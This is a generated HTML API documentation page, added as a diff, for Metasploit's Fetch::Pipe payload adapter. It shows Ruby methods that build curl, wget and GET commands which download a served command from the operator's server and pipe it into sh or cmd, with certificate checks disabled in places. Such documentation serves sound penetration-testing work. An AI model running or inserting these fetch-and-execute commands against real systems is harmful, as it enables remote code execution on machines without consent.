@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>
+  Module: Msf::Payload::Adapter::Fetch::Pipe
+  
+    &mdash; Documentation by YARD 0.9.37
+  
+</title>
+
+  <link rel="stylesheet" href="../../../../css/style.css" type="text/css" />
+
+  <link rel="stylesheet" href="../../../../css/common.css" type="text/css" />
+
+<script type="text/javascript">
+  pathId = "Msf::Payload::Adapter::Fetch::Pipe";
+  relpath = '../../../../';
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div class="nav_wrap">
+      <iframe id="nav" src="../../../../class_list.html?1"></iframe>
+      <div id="resizer"></div>
+    </div>
+
+    <div id="main" tabindex="-1">
+      <div id="header">
+        <div id="menu">
+  
+    <a href="../../../../_index.html">Index (P)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../../Payload.html" title="Msf::Payload (class)">Payload</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../Adapter.html" title="Msf::Payload::Adapter (module)">Adapter</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Fetch.html" title="Msf::Payload::Adapter::Fetch (module)">Fetch</a></span></span>
+     &raquo; 
+    <span class="title">Pipe</span>
+  
+</div>
+
+        <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../../../class_list.html">
+
+        <svg width="24" height="24">
+          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
+        </svg>
+    </a>
+  
+</div>
+        <div class="clear"></div>
+      </div>
+
+      <div id="content"><h1>Module: Msf::Payload::Adapter::Fetch::Pipe
+  
+  
+  
+</h1>
+<div class="box_info">
+  
+
+  
+  
+  
+  
+  
+
+  
+  <dl>
+    <dt>Included in:</dt>
+    <dd><span class='object_link'><a href="../Fetch.html" title="Msf::Payload::Adapter::Fetch (module)">Msf::Payload::Adapter::Fetch</a></span></dd>
+  </dl>
+  
+
+  
+  <dl>
+    <dt>Defined in:</dt>
+    <dd>lib/msf/core/payload/adapter/fetch/pipe.rb</dd>
+  </dl>
+  
+</div>
+
+<h2>Overview</h2><div class="docstring">
+  <div class="discussion">
+    
+<p>Common library for pipe-enabled fetch payloads</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div>
+
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small><a href="#" class="summary_toggle">collapse</a></small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#_download_pipe-instance_method" title="#_download_pipe (instance method)">#<strong>_download_pipe</strong>(uripath)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#_generate_curl_pipe-instance_method" title="#_generate_curl_pipe (instance method)">#<strong>_generate_curl_pipe</strong>(uri)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#_generate_get_pipe-instance_method" title="#_generate_get_pipe (instance method)">#<strong>_generate_get_pipe</strong>(uri)  &#x21d2; String </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Builds a GET command that streams a served command directly into a shell.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#_generate_wget_pipe-instance_method" title="#_generate_wget_pipe (instance method)">#<strong>_generate_wget_pipe</strong>(uri)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate_pipe_command-instance_method" title="#generate_pipe_command (instance method)">#<strong>generate_pipe_command</strong>(uri)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#pipe_supported_binaries-instance_method" title="#pipe_supported_binaries (instance method)">#<strong>pipe_supported_binaries</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="_download_pipe-instance_method">
+  
+    #<strong>_download_pipe</strong>(uripath)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+8
+9
+10</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/adapter/fetch/pipe.rb', line 8</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid__download_pipe'>_download_pipe</span><span class='lparen'>(</span><span class='id identifier rubyid_uripath'>uripath</span><span class='rparen'>)</span>
+  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_srvnetloc'>srvnetloc</span><span class='embexpr_end'>}</span><span class='tstring_content'>/</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_uripath'>uripath</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="_generate_curl_pipe-instance_method">
+  
+    #<strong>_generate_curl_pipe</strong>(uri)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/adapter/fetch/pipe.rb', line 32</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid__generate_curl_pipe'>_generate_curl_pipe</span><span class='lparen'>(</span><span class='id identifier rubyid_uri'><span class='object_link'><a href="../../../../top-level-namespace.html#uri-instance_method" title="#uri (method)">uri</a></span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_execute_cmd'>execute_cmd</span> <span class='op'>=</span> <span class='id identifier rubyid_windows?'>windows?</span> <span class='op'>?</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>cmd</span><span class='tstring_end'>&#39;</span></span> <span class='op'>:</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>sh</span><span class='tstring_end'>&#39;</span></span>
+  <span class='kw'>case</span> <span class='id identifier rubyid_fetch_protocol'>fetch_protocol</span>
+  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HTTP</span><span class='tstring_end'>&#39;</span></span>
+    <span class='kw'>return</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>curl -s http://</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid__download_pipe'>_download_pipe</span><span class='lparen'>(</span><span class='id identifier rubyid_uri'><span class='object_link'><a href="../../../../top-level-namespace.html#uri-instance_method" title="#uri (method)">uri</a></span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>|</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_execute_cmd'>execute_cmd</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HTTPS</span><span class='tstring_end'>&#39;</span></span>
+    <span class='kw'>return</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>curl -sk https://</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid__download_pipe'>_download_pipe</span><span class='lparen'>(</span><span class='id identifier rubyid_uri'><span class='object_link'><a href="../../../../top-level-namespace.html#uri-instance_method" title="#uri (method)">uri</a></span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>|</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_execute_cmd'>execute_cmd</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_fail_with'>fail_with</span><span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Module.html" title="Msf::Module (class)">Module</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Module/Failure.html" title="Msf::Module::Failure (module)">Failure</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Module/Failure.html#BadConfig-constant" title="Msf::Module::Failure::BadConfig (constant)">BadConfig</a></span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Unsupported protocol: </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_fetch_protocol'>fetch_protocol</span><span class='period'>.</span><span class='id identifier rubyid_inspect'>inspect</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="_generate_get_pipe-instance_method">
+  
+    #<strong>_generate_get_pipe</strong>(uri)  &#x21d2; <tt>String</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Builds a GET command that streams a served command directly into a shell.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>The GET pipe command.</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/adapter/fetch/pipe.rb', line 58</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid__generate_get_pipe'>_generate_get_pipe</span><span class='lparen'>(</span><span class='id identifier rubyid_uri'><span class='object_link'><a href="../../../../top-level-namespace.html#uri-instance_method" title="#uri (method)">uri</a></span></span><span class='rparen'>)</span>
+  <span class='comment'># Specifying the method (-m GET) is necessary on OSX
+</span>  <span class='id identifier rubyid_execute_cmd'>execute_cmd</span> <span class='op'>=</span> <span class='id identifier rubyid_windows?'>windows?</span> <span class='op'>?</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>cmd</span><span class='tstring_end'>&#39;</span></span> <span class='op'>:</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>sh</span><span class='tstring_end'>&#39;</span></span>
+  <span class='kw'>case</span> <span class='id identifier rubyid_fetch_protocol'>fetch_protocol</span>
+  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HTTP</span><span class='tstring_end'>&#39;</span></span>
+    <span class='kw'>return</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>GET -m GET http://</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid__download_pipe'>_download_pipe</span><span class='lparen'>(</span><span class='id identifier rubyid_uri'><span class='object_link'><a href="../../../../top-level-namespace.html#uri-instance_method" title="#uri (method)">uri</a></span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>|</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_execute_cmd'>execute_cmd</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HTTPS</span><span class='tstring_end'>&#39;</span></span>
+    <span class='comment'># There is no way to disable cert check in GET ...
+</span>    <span class='id identifier rubyid_print_error'>print_error</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>GET binary does not support insecure mode</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_fail_with'>fail_with</span><span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Module.html" title="Msf::Module (class)">Module</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Module/Failure.html" title="Msf::Module::Failure (module)">Failure</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Module/Failure.html#BadConfig-constant" title="Msf::Module::Failure::BadConfig (constant)">BadConfig</a></span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FETCH_CHECK_CERT must be true when using GET</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+    <span class='kw'>return</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>GET -m GET https://</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid__download_pipe'>_download_pipe</span><span class='lparen'>(</span><span class='id identifier rubyid_uri'><span class='object_link'><a href="../../../../top-level-namespace.html#uri-instance_method" title="#uri (method)">uri</a></span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>|</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_execute_cmd'>execute_cmd</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FTP</span><span class='tstring_end'>&#39;</span></span>
+    <span class='kw'>return</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>GET ftp://</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid__download_pipe'>_download_pipe</span><span class='lparen'>(</span><span class='id identifier rubyid_uri'><span class='object_link'><a href="../../../../top-level-namespace.html#uri-instance_method" title="#uri (method)">uri</a></span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>|</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_execute_cmd'>execute_cmd</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_fail_with'>fail_with</span><span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Module.html" title="Msf::Module (class)">Module</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Module/Failure.html" title="Msf::Module::Failure (module)">Failure</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Module/Failure.html#BadConfig-constant" title="Msf::Module::Failure::BadConfig (constant)">BadConfig</a></span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Unsupported protocol: </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_fetch_protocol'>fetch_protocol</span><span class='period'>.</span><span class='id identifier rubyid_inspect'>inspect</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="_generate_wget_pipe-instance_method">
+  
+    #<strong>_generate_wget_pipe</strong>(uri)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/adapter/fetch/pipe.rb', line 44</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid__generate_wget_pipe'>_generate_wget_pipe</span><span class='lparen'>(</span><span class='id identifier rubyid_uri'><span class='object_link'><a href="../../../../top-level-namespace.html#uri-instance_method" title="#uri (method)">uri</a></span></span><span class='rparen'>)</span>
+  <span class='kw'>case</span> <span class='id identifier rubyid_fetch_protocol'>fetch_protocol</span>
+  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HTTPS</span><span class='tstring_end'>&#39;</span></span>
+    <span class='kw'>return</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>wget --no-check-certificate -qO- https://</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid__download_pipe'>_download_pipe</span><span class='lparen'>(</span><span class='id identifier rubyid_uri'><span class='object_link'><a href="../../../../top-level-namespace.html#uri-instance_method" title="#uri (method)">uri</a></span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>|sh</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HTTP</span><span class='tstring_end'>&#39;</span></span>
+    <span class='kw'>return</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>wget -qO- http://</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid__download_pipe'>_download_pipe</span><span class='lparen'>(</span><span class='id identifier rubyid_uri'><span class='object_link'><a href="../../../../top-level-namespace.html#uri-instance_method" title="#uri (method)">uri</a></span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>|sh</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_fail_with'>fail_with</span><span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Module.html" title="Msf::Module (class)">Module</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Module/Failure.html" title="Msf::Module::Failure (module)">Failure</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Module/Failure.html#BadConfig-constant" title="Msf::Module::Failure::BadConfig (constant)">BadConfig</a></span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Unsupported protocol: </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_fetch_protocol'>fetch_protocol</span><span class='period'>.</span><span class='id identifier rubyid_inspect'>inspect</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="generate_pipe_command-instance_method">
+  
+    #<strong>generate_pipe_command</strong>(uri)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/adapter/fetch/pipe.rb', line 19</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_generate_pipe_command'>generate_pipe_command</span><span class='lparen'>(</span><span class='id identifier rubyid_uri'><span class='object_link'><a href="../../../../top-level-namespace.html#uri-instance_method" title="#uri (method)">uri</a></span></span><span class='rparen'>)</span>
+  <span class='kw'>case</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FETCH_COMMAND</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_upcase'>upcase</span>
+  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WGET</span><span class='tstring_end'>&#39;</span></span>
+    <span class='kw'>return</span> <span class='id identifier rubyid__generate_wget_pipe'>_generate_wget_pipe</span><span class='lparen'>(</span><span class='id identifier rubyid_uri'><span class='object_link'><a href="../../../../top-level-namespace.html#uri-instance_method" title="#uri (method)">uri</a></span></span><span class='rparen'>)</span>
+  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>CURL</span><span class='tstring_end'>&#39;</span></span>
+    <span class='kw'>return</span> <span class='id identifier rubyid__generate_curl_pipe'>_generate_curl_pipe</span><span class='lparen'>(</span><span class='id identifier rubyid_uri'><span class='object_link'><a href="../../../../top-level-namespace.html#uri-instance_method" title="#uri (method)">uri</a></span></span><span class='rparen'>)</span>
+  <span class='kw'>when</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>GET</span><span class='tstring_end'>&#39;</span></span>
+    <span class='kw'>return</span> <span class='id identifier rubyid__generate_get_pipe'>_generate_get_pipe</span><span class='lparen'>(</span><span class='id identifier rubyid_uri'><span class='object_link'><a href="../../../../top-level-namespace.html#uri-instance_method" title="#uri (method)">uri</a></span></span><span class='rparen'>)</span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_fail_with'>fail_with</span><span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Module.html" title="Msf::Module (class)">Module</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Module/Failure.html" title="Msf::Module::Failure (module)">Failure</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../../Module/Failure.html#BadConfig-constant" title="Msf::Module::Failure::BadConfig (constant)">BadConfig</a></span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Unsupported binary selected for FETCH_PIPE option: </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FETCH_COMMAND</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='embexpr_end'>}</span><span class='tstring_content'>, must be one of </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_pipe_supported_binaries'>pipe_supported_binaries</span><span class='embexpr_end'>}</span><span class='tstring_content'>.</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="pipe_supported_binaries-instance_method">
+  
+    #<strong>pipe_supported_binaries</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+12
+13
+14
+15
+16
+17</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/adapter/fetch/pipe.rb', line 12</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_pipe_supported_binaries'>pipe_supported_binaries</span>
+  <span class='comment'># this is going to expand when we add psh support
+</span>  <span class='kw'>return</span> <span class='qwords_beg'>%w[</span><span class='tstring_content'>CURL</span><span class='tstring_end'>]</span></span> <span class='kw'>if</span> <span class='id identifier rubyid_windows?'>windows?</span>
+
+  <span class='qwords_beg'>%w[</span><span class='tstring_content'>WGET</span><span class='words_sep'> </span><span class='tstring_content'>CURL</span><span class='words_sep'> </span><span class='tstring_content'>GET</span><span class='tstring_end'>]</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+      <div id="footer">
+  Generated on Thu Sep  3 17:24:47 2026 by
+  <a href="https://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.9.37 (ruby-3.3.12).
+</div>
+
+    </div>
+  </body>
+</html>
